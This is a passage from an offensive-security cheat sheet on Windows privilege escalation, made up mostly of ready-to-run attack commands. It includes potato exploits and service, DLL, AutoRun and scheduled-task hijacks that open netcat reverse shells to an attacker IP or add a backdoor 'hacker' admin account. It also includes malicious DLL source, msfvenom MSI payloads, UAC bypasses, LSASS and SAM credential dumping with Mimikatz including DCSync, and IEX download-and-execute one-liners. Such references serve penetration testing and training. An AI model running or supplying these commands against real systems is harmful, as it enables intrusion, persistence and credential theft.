  GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe"

  Add admin user
  GodPotato.exe -cmd "net user hacker Password123! /add && net localgroup Administrators hacker /add"

  Execute from SMB share
  \\10.10.14.5\share\GodPotato.exe -cmd "cmd /c whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-printer" label="PrintSpoofer"}

  **Works on:** Windows 10 / Server 2016, 2019. Exploits the Print Spooler service named pipe.

  ```powershell [PrintSpoofer]
  Interactive SYSTEM shell
  PrintSpoofer.exe -i -c cmd
  PrintSpoofer.exe -i -c powershell.exe

  Reverse shell as SYSTEM
  PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe"
  ```
  :::

  :::tabs-item{icon="i-lucide-citrus" label="JuicyPotato"}

  **Works on:** Windows Server 2008 – 2016, Windows 7 – 10. Requires a valid **CLSID** for the target OS version.

  ```powershell [JuicyPotato]
  Basic usage with CLSID
  JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

  Reverse shell
  JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "10.10.14.5 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

  Find CLSIDs for your target OS:
  https://ohpe.it/juicy-potato/CLSID/
  ```
  :::

  :::tabs-item{icon="i-lucide-candy" label="SweetPotato / Rogue"}
  ```powershell [SweetPotato — Combined Techniques]
  Tries multiple potato variants automatically
  SweetPotato.exe -p C:\Windows\Temp\nc.exe -a "10.10.14.5 4444 -e cmd.exe"
  ```

  ```powershell [RoguePotato — For Server 2019+]
  Requires attacker machine for relay
  Attacker: socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
  RoguePotato.exe -r 10.10.14.5 -e "cmd.exe /c C:\Windows\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe" -l 9999
  ```
  :::
::

::card-group
  ::card
  ---
  title: GodPotato
  icon: i-simple-icons-github
  to: https://github.com/BeichenDream/GodPotato
  target: _blank
  ---
  1.8K+ ⭐ — Universal potato exploit for all modern Windows versions.
  ::

  ::card
  ---
  title: PrintSpoofer
  icon: i-simple-icons-github
  to: https://github.com/itm4n/PrintSpoofer
  target: _blank
  ---
  1.5K+ ⭐ — SeImpersonatePrivilege to SYSTEM via Print Spooler.
  ::

  ::card
  ---
  title: JuicyPotato CLSID List
  icon: i-lucide-globe
  to: https://ohpe.it/juicy-potato/CLSID/
  target: _blank
  ---
  CLSID reference for every Windows version — required for JuicyPotato.
  ::
::

---

### Other Dangerous Privileges

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Privileges" color="green"}
  :badge{label="Backup" color="orange"}
  :badge{label="Debug" color="red"}
  :badge{label="Advanced" color="purple"}
::

::tabs
  :::tabs-item{icon="i-lucide-database" label="SeBackupPrivilege"}

  **Allows reading ANY file** on the system, including SAM, SYSTEM, and NTDS.dit. Extract these files and crack the hashes offline.

  ```powershell [Extract SAM/SYSTEM]
  Method 1: reg save
  reg save HKLM\SAM C:\Temp\SAM
  reg save HKLM\SYSTEM C:\Temp\SYSTEM
  reg save HKLM\SECURITY C:\Temp\SECURITY

  Method 2: robocopy with /b (backup mode)
  robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM

  On attacker — extract hashes
  impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
  ```
  :::

  :::tabs-item{icon="i-lucide-file-pen" label="SeRestorePrivilege"}

  **Allows writing to ANY file** — replace system binaries, modify configurations, add backdoors.

  ```powershell [Replace utilman.exe for RDP backdoor]
  Replace accessibility tool with cmd.exe
  copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

  At RDP login screen: click Accessibility button
  → SYSTEM cmd.exe shell
  ```
  :::

  :::tabs-item{icon="i-lucide-bug" label="SeDebugPrivilege"}

  **Allows debugging (injecting into) ANY process** — dump LSASS for credential extraction.

  ```powershell [Dump LSASS]
  Using comsvcs.dll (built-in — no tools needed)
  tasklist | findstr lsass
  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

  Using procdump (Sysinternals)
  procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

  Analyze on attacker
  mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
  pypykatz lsa minidump lsass.dmp

  Or use Mimikatz directly on target
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  ```
  :::

  :::tabs-item{icon="i-lucide-key-round" label="SeTakeOwnership"}

  **Allows taking ownership of ANY object** — files, registry keys, services.

  ```powershell [Take ownership and read]
  takeown /f C:\Windows\System32\config\SAM
  icacls C:\Windows\System32\config\SAM /grant %USERNAME%:F
  copy C:\Windows\System32\config\SAM C:\Temp\
  ```
  :::
::

### Privilege → Exploitation Quick Reference

| Privilege | Exploitation | Result |
| --------- | ------------ | ------ |
| `SeImpersonatePrivilege` | Potato attacks (GodPotato, PrintSpoofer, JuicyPotato) | SYSTEM shell |
| `SeAssignPrimaryTokenPrivilege` | Potato attacks | SYSTEM shell |
| `SeBackupPrivilege` | `reg save` SAM/SYSTEM → secretsdump | Password hashes |
| `SeRestorePrivilege` | Replace utilman.exe → RDP backdoor | SYSTEM cmd |
| `SeTakeOwnershipPrivilege` | `takeown` + `icacls` → read protected files | File access |
| `SeDebugPrivilege` | Dump LSASS → Mimikatz/pypykatz | Plaintext creds |
| `SeLoadDriverPrivilege` | Load vulnerable driver (Capcom.sys) | Kernel code exec |

---

## :icon{name="i-lucide-settings"} Windows — Service Exploits

### How Service Privilege Escalation Works

Windows **services** are long-running processes that typically run under privileged accounts (`LocalSystem`, `LocalService`, `NetworkService`). If a service's configuration or binaries can be **modified** by a low-privilege user, you can make the service execute your payload with elevated privileges.

Four main service attack vectors:
1. **Unquoted Service Path** — hijack the path resolution
2. **Weak Service Permissions** — reconfigure the binary path
3. **Writable Service Binary** — replace the executable directly
4. **DLL Hijacking** — plant a malicious DLL the service loads

### Service — Enumeration

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Service" color="green"}
  :badge{label="Enumeration" color="orange"}
  :badge{label="Permissions" color="red"}
::

```powershell [Enumerate All Services]
:: All services with paths
wmic service get name,pathname,startmode,startname

:: Find unquoted service paths with spaces
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: Check specific service config
sc qc VulnerableService

:: Check service permissions (Sysinternals accesschk)
accesschk.exe /accepteula -uwcqv "Everyone" * /svc
accesschk.exe /accepteula -uwcqv "Authenticated Users" * /svc
accesschk.exe /accepteula -uwcqv "%USERNAME%" * /svc

:: PowerUp — automated service checks
Import-Module .\PowerUp.ps1
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
```

---

### Unquoted Service Path

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Service" color="green"}
  :badge{label="Unquoted Path" color="orange"}
  :badge{label="Space in Path" color="red"}
  :badge{label="Very Common" color="purple"}
::

![Unquoted Path](https://img.shields.io/badge/Unquoted_Service_Path-E67E22?style=for-the-badge)

**How it works:** When Windows starts a service with an **unquoted path** that contains **spaces**, it tries multiple interpretations in order. For `C:\Program Files\Vuln App\service.exe`:

| Order | Windows tries | File needed |
| ----- | ------------- | ----------- |
| 1st | `C:\Program.exe` | Place binary at `C:\` |
| 2nd | `C:\Program Files\Vuln.exe` | Place binary in `C:\Program Files\` |
| 3rd | `C:\Program Files\Vuln App\service.exe` | Intended binary |

If you can write to any of the earlier directories, you can hijack the service.

```powershell [Step 1 — Find vulnerable services]
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
:: Look for paths like:
:: C:\Program Files\Vuln App\service.exe  (no quotes + spaces = VULNERABLE)
```

```powershell [Step 2 — Check directory write permissions]
icacls "C:\"
icacls "C:\Program Files\"
icacls "C:\Program Files\Vuln App\"
accesschk.exe /accepteula -uwdq "C:\Program Files\Vuln App\"
```

```powershell [Step 3 — Place payload and restart]
:: Generate payload on attacker:
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Vuln.exe

:: Place in hijackable location
copy C:\Windows\Temp\payload.exe "C:\Program Files\Vuln.exe"

:: Restart the service
sc stop "Vuln App"
sc start "Vuln App"

:: If can't restart, wait for reboot:
shutdown /r /t 0
```

---

### Weak Service Permissions (DACL)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Service" color="green"}
  :badge{label="Weak DACL" color="orange"}
  :badge{label="Reconfigure" color="red"}
  :badge{label="SERVICE_CHANGE_CONFIG" color="purple"}
::

**How it works:** If your user has `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS` permission on a service, you can **change the service's binary path** to point to your payload. When the service restarts, Windows executes your binary instead.

```powershell [Step 1 — Find modifiable services]
accesschk.exe /accepteula -uwcqv "%USERNAME%" * /svc
:: Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, GENERIC_WRITE

sc sdshow VulnerableService
```

```powershell [Step 2 — Reconfigure and exploit]
:: Change binary path to reverse shell
sc config VulnerableService binpath= "C:\Windows\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe"

:: Or add admin user
sc config VulnerableService binpath= "cmd /c net user hacker Password123! /add && net localgroup Administrators hacker /add"

:: Restart
sc stop VulnerableService
sc start VulnerableService

:: Restore original path when done
sc config VulnerableService binpath= "C:\original\path\service.exe"
```

---

### Writable Service Binary

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Service" color="green"}
  :badge{label="Writable Binary" color="orange"}
  :badge{label="Replace Exe" color="red"}
::

If the actual service executable file has **weak file permissions**, replace it directly with your payload.

```powershell [Check and exploit]
:: Check file permissions
icacls "C:\Program Files\VulnApp\service.exe"
:: Look for: (M) Modify, (F) Full Control, (W) Write

:: Replace binary
copy /Y C:\Windows\Temp\payload.exe "C:\Program Files\VulnApp\service.exe"

:: Restart service
sc stop VulnApp
sc start VulnApp
```

---

### DLL Hijacking

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Service" color="green"}
  :badge{label="DLL Hijack" color="orange"}
  :badge{label="Missing DLL" color="red"}
  :badge{label="Search Order" color="purple"}
::

**How it works:** Windows searches for DLLs in a specific order. If a service tries to load a DLL that **doesn't exist** or exists in a **writable directory** earlier in the search path, you can plant a malicious DLL.

**Windows DLL search order:**
1. Application directory
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current directory
6. PATH directories

```powershell [Find missing DLLs — Use Process Monitor (Procmon)]
:: Filter in Procmon:
:: Result = "NAME NOT FOUND"
:: Path ends with ".dll"
:: Process Name = target service

:: Or use PowerUp
Import-Module .\PowerUp.ps1
Find-ProcessDLLHijack
Find-PathDLLHijack
```

```c [Create malicious DLL (malicious_dll.c)]
// Cross-compile: x86_64-w64-mingw32-gcc malicious_dll.c -shared -o hijacked.dll
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user hacker Password123! /add && net localgroup Administrators hacker /add");
    }
    return TRUE;
}
```

```powershell [Place and trigger]
:: Place in writable search path
copy hijacked.dll "C:\Writable\Directory\missing.dll"

:: Restart the service
sc stop VulnService
sc start VulnService
```

---

## :icon{name="i-lucide-file-cog"} Windows — Registry & Misconfiguration

### AlwaysInstallElevated

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Registry" color="green"}
  :badge{label="MSI" color="orange"}
  :badge{label="Instant SYSTEM" color="red"}
  :badge{label="Rare but Devastating" color="purple"}
::

**How it works:** If **both** `AlwaysInstallElevated` registry keys (HKLM and HKCU) are set to `1`, any user can install MSI packages with **SYSTEM privileges**. This is a GPO misconfiguration that grants an instant SYSTEM shell.

```powershell [Step 1 — Check both registry keys]
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: BOTH must return: AlwaysInstallElevated    REG_DWORD    0x1
```

```bash [Step 2 — Generate MSI payload (on attacker)]
# Reverse shell MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi

# Add admin user MSI
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi
```

```powershell [Step 3 — Install on target]
:: Silent install as SYSTEM
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

---

### AutoRun Programs

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Registry" color="green"}
  :badge{label="AutoRun" color="orange"}
  :badge{label="Writable Binary" color="red"}
::

```powershell [Check AutoRun entries]
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Check if AutoRun binaries are writable
:: For each binary path found:
icacls "C:\Program Files\AutoRunApp\app.exe"
accesschk.exe /accepteula -wvu "C:\Program Files\AutoRunApp\app.exe"
```

```powershell [Replace writable AutoRun binary]
copy /Y C:\Windows\Temp\payload.exe "C:\Program Files\AutoRunApp\app.exe"
:: Wait for admin login or trigger reboot
shutdown /r /t 0
```

---

### Scheduled Task Abuse

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Scheduled Tasks" color="green"}
  :badge{label="Writable Script" color="orange"}
  :badge{label="SYSTEM Context" color="red"}
::

```powershell [Enumerate SYSTEM tasks]
schtasks /query /fo LIST /v | findstr /i "task\|run as\|next\|status"
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Format-Table TaskName,State
```

```powershell [Check script permissions]
icacls "C:\Scripts\backup.bat"
```

```powershell [Modify writable script]
:: Add payload to scheduled task script
echo C:\Windows\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe >> "C:\Scripts\backup.bat"

:: Or add admin user
echo net user hacker Password123! /add >> "C:\Scripts\backup.bat"
echo net localgroup Administrators hacker /add >> "C:\Scripts\backup.bat"

:: Trigger manually if possible
schtasks /run /tn "TaskName"
```

---

## :icon{name="i-lucide-shield"} Windows — UAC Bypass

### How UAC Bypass Works

**User Account Control (UAC)** prompts for consent when applications request elevated privileges. However, certain **auto-elevating binaries** (Microsoft-signed executables that are trusted by Windows) can be tricked into executing attacker-controlled code at an elevated privilege level without triggering the UAC prompt.

### UAC Bypass Payloads

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="UAC" color="green"}
  :badge{label="Bypass" color="orange"}
  :badge{label="Auto-Elevate" color="red"}
  :badge{label="fodhelper" color="purple"}
::

```powershell [Check UAC status]
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
:: EnableLUA = 1 → UAC enabled
:: ConsentPromptBehaviorAdmin = 0 → already bypassed (no prompt)
:: ConsentPromptBehaviorAdmin = 5 → default (prompt for non-Windows binaries)
```

::code-collapse

```powershell [fodhelper.exe — Most Reliable (Windows 10/11)]
:: fodhelper auto-elevates and checks registry for ms-settings handler
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe

:: Cleanup
reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f
```

```powershell [eventvwr.exe — Windows 10]
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "C:\Windows\Temp\payload.exe" /f
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
eventvwr.exe

:: Cleanup
reg delete HKCU\Software\Classes\mscfile\Shell\Open\command /f
```

```powershell [Disk Cleanup — Environment Variable]
:: Scheduled task runs as high integrity
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\Windows\Temp\payload.exe &" /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

:: Cleanup
reg delete "HKCU\Environment" /v "windir" /f
```

```powershell [UACME — Comprehensive Tool (70+ methods)]
:: https://github.com/hfiref0x/UACME
Akagi64.exe <method_number> "C:\Windows\Temp\payload.exe"
```

::

::card-group
  ::card
  ---
  title: UACME
  icon: i-simple-icons-github
  to: https://github.com/hfiref0x/UACME
  target: _blank
  ---
  70+ UAC bypass methods for Windows 7 through Windows 11.
  ::
::

---

## :icon{name="i-lucide-key-round"} Windows — Credential Extraction

### Post-Exploitation — Dumping Credentials

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Credentials" color="green"}
  :badge{label="Mimikatz" color="orange"}
  :badge{label="SAM Dump" color="red"}
  :badge{label="LSASS" color="purple"}
  :badge{label="SYSTEM Required" color="neutral"}
::

![Mimikatz](https://img.shields.io/badge/Mimikatz-DC382D?style=for-the-badge) ![secretsdump](https://img.shields.io/badge/secretsdump-3776AB?style=for-the-badge)

Once you have SYSTEM or Administrator access, extracting credentials enables **lateral movement** to other machines and **persistence**. Windows stores credentials in multiple locations — LSASS process memory, SAM registry hive, LSA secrets, and DPAPI vaults.

::tabs
  :::tabs-item{icon="i-lucide-database" label="SAM / SYSTEM Dump"}
  ```powershell [Registry Save Method]
  reg save HKLM\SAM C:\Temp\SAM
  reg save HKLM\SYSTEM C:\Temp\SYSTEM
  reg save HKLM\SECURITY C:\Temp\SECURITY

  Transfer to attacker, then extract:
  impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
  ```

  ```powershell [Volume Shadow Copy — Bypass File Locks]
  Create shadow copy
  wmic shadowcopy call create Volume='C:\'

  List shadows
  vssadmin list shadows

  Copy from shadow
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
  ```
  :::

  :::tabs-item{icon="i-lucide-key-round" label="Mimikatz"}
  ```powershell [Mimikatz — Interactive]
  mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords
  lsadump::sam
  exit
  ```

  ```powershell [Mimikatz — One-liners]
  Dump logon passwords
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  Dump SAM
  mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

  DCSync — dump domain hashes
  mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:Administrator" "exit"
  mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /all /csv" "exit"
  ```

  ```powershell [Invoke-Mimikatz — Fileless]
  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
  Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
  ```
  :::

  :::tabs-item{icon="i-lucide-cpu" label="LSASS Dump"}
  ```powershell [comsvcs.dll — Built-in, No Tools Needed]
  Find LSASS PID
  tasklist | findstr lsass

  Dump using MiniDump
  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
  ```

  ```powershell [procdump — Sysinternals]
  procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
  ```

  ```bash [Analyze dump on attacker]
  # Mimikatz
  mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

  # pypykatz (Python — runs on Linux)
  pypykatz lsa minidump lsass.dmp
  ```
  :::
::

::card-group
  ::card
  ---
  title: Mimikatz
  icon: i-simple-icons-github
  to: https://github.com/gentilkiwi/mimikatz
  target: _blank
  ---
  20K+ ⭐ — THE Windows credential extraction tool — LSASS, SAM, DCSync, Golden Tickets.
  ::

  ::card
  ---
  title: pypykatz
  icon: i-simple-icons-github
  to: https://github.com/skelsec/pypykatz
  target: _blank
  ---
  Pure Python Mimikatz implementation — analyze LSASS dumps on Linux.
  ::

  ::card
  ---
  title: Impacket — secretsdump
  icon: i-simple-icons-github
  to: https://github.com/fortra/impacket
  target: _blank
  ---
  14K+ ⭐ — Extract hashes from SAM, SYSTEM, and NTDS.dit files.
  ::
::

---

## :icon{name="i-lucide-bug"} Windows — Kernel Exploits

### Windows Kernel CVEs

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Kernel" color="green"}
  :badge{label="CVE" color="orange"}
  :badge{label="Last Resort" color="red"}
  :badge{label="BSOD Risk" color="purple"}
::

::warning
Windows kernel exploits can cause **Blue Screen of Death (BSOD)**. Use only as a last resort. Always verify the exact OS version, build number, and installed patches before attempting. Never use on production systems without explicit authorization.
::

```powershell [Identify OS Version]
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get caption,version,buildnumber
wmic qfe list
```

::code-collapse

```powershell [Automated Exploit Suggestion]
:: Windows Exploit Suggester (attacker side)
systeminfo > sysinfo.txt
:: Transfer sysinfo.txt to attacker
python windows-exploit-suggester.py --database 2024-mssb.xls --systeminfo sysinfo.txt

:: Watson (on target — C#)
\\10.10.14.5\share\Watson.exe

:: Sherlock (on target — PowerShell)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Sherlock.ps1')
Find-AllVulns
```

```powershell [Notable Windows Kernel CVEs]
:: CVE-2021-36934 — HiveNightmare / SeriousSAM
:: Windows 10 1809+ — SAM/SYSTEM readable by non-admin
icacls C:\Windows\System32\config\SAM
:: If readable:
copy C:\Windows\System32\config\SAM C:\Temp\
copy C:\Windows\System32\config\SYSTEM C:\Temp\

:: CVE-2021-1732 — Win32k Elevation of Privilege
:: Windows 10 1803-20H2, Server 2019

:: CVE-2020-0787 — BITS Arbitrary File Move
:: Windows 7-10, Server 2008-2019

:: CVE-2019-1388 — UAC Bypass via Certificate Dialog
:: Requires GUI (RDP) — Windows 7-10, Server 2008-2019

:: MS16-032 — Secondary Logon Handle
:: Windows 7-10, Server 2008-2012 R2
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032

:: MS17-010 — EternalBlue (remote, not local PrivEsc)
:: Windows XP-7, Server 2003-2008 R2
```

::

::card-group
  ::card
  ---
  title: Windows Exploit Suggester
  icon: i-simple-icons-github
  to: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
  target: _blank
  ---
  Suggest exploits based on systeminfo output and Microsoft patch database.
  ::

  ::card
  ---
  title: Watson
  icon: i-simple-icons-github
  to: https://github.com/rasta-mouse/Watson
  target: _blank
  ---
  C# enumeration of missing KBs and suggested CVEs — runs on target.
  ::
::

---

## :icon{name="i-lucide-list-checks"} PrivEsc Decision Matrix

### Prioritized Check Order

The order matters — start with the **highest success rate, lowest risk** techniques and work down.

::steps{level="4"}

#### Linux — Check Order

| Priority | Vector | Command | Success Rate |
| -------- | ------ | ------- | ------------ |
| 1 | Sudo permissions | `sudo -l` | :badge{label="Very High" color="green"} |
| 2 | SUID binaries | `find / -perm -4000 2>/dev/null` | :badge{label="High" color="green"} |
| 3 | Stored credentials | History, config files, .env | :badge{label="High" color="green"} |
| 4 | Cron jobs | `cat /etc/crontab` + `pspy` | :badge{label="Medium" color="orange"} |
| 5 | Capabilities | `getcap -r / 2>/dev/null` | :badge{label="Medium" color="orange"} |
| 6 | Writable passwd/shadow | `ls -la /etc/passwd /etc/shadow` | :badge{label="Low" color="red"} |
| 7 | Docker/LXD group | `id` (check groups) | :badge{label="Medium" color="orange"} |
| 8 | SSH keys | `find / -name id_rsa` | :badge{label="Medium" color="orange"} |
| 9 | NFS no_root_squash | `cat /etc/exports` | :badge{label="Low" color="red"} |
| 10 | Kernel exploits | `uname -r` + suggester | :badge{label="Last Resort" color="red"} |

#### Windows — Check Order

| Priority | Vector | Command | Success Rate |
| -------- | ------ | ------- | ------------ |
| 1 | Token privileges | `whoami /priv` | :badge{label="Very High" color="green"} |
| 2 | Stored credentials | `cmdkey /list`, registry | :badge{label="High" color="green"} |
| 3 | Service misconfigs | `wmic service get` + PowerUp | :badge{label="High" color="green"} |
| 4 | Unquoted paths | PowerUp / manual | :badge{label="Medium" color="orange"} |
| 5 | AlwaysInstallElevated | Registry query | :badge{label="Low" color="red"} |
| 6 | Scheduled tasks | `schtasks /query` | :badge{label="Medium" color="orange"} |
| 7 | Password hunting | `findstr /si password` | :badge{label="Medium" color="orange"} |
| 8 | AutoRun programs | Registry + permissions | :badge{label="Low" color="red"} |
| 9 | DLL hijacking | Process Monitor | :badge{label="Medium" color="orange"} |
| 10 | Kernel exploits | `systeminfo` + suggester | :badge{label="Last Resort" color="red"} |

::

---

## :icon{name="i-lucide-book-open"} References

::card-group
  ::card
  ---
  title: HackTricks — Linux PrivEsc
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
  target: _blank
  ---
  The most comprehensive Linux privilege escalation reference — hundreds of techniques with commands.
  ::

  ::card
  ---
  title: HackTricks — Windows PrivEsc
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
  target: _blank
  ---
  Comprehensive Windows local privilege escalation reference with payloads.
  ::

  ::card
  ---
  title: GTFOBins
  icon: i-lucide-terminal
  to: https://gtfobins.github.io/
  target: _blank
  ---
  Linux binaries exploitable for PrivEsc — SUID, sudo, capabilities — with exact commands.
  ::

  ::card
  ---
  title: LOLBAS Project
  icon: i-lucide-terminal
  to: https://lolbas-project.github.io/
  target: _blank
  ---
  Windows Living Off The Land Binaries — download, execute, and persistence techniques.
  ::

  ::card
  ---
  title: WADComs
  icon: i-lucide-globe
  to: https://wadcoms.github.io/
  target: _blank
  ---
  Interactive cheatsheet for Windows and Active Directory offensive commands.
  ::

  ::card
  ---
  title: PEASS-ng
  icon: i-simple-icons-github
  to: https://github.com/peass-ng/PEASS-ng
  target: _blank
  ---
  16K+ ⭐ — linPEAS + winPEAS — the essential automated enumeration suite.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — Linux PrivEsc
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
  target: _blank
  ---
  Linux privilege escalation payloads and techniques from PayloadsAllTheThings.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — Windows PrivEsc
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
  target: _blank
  ---
  Windows privilege escalation payloads and techniques.
  ::
::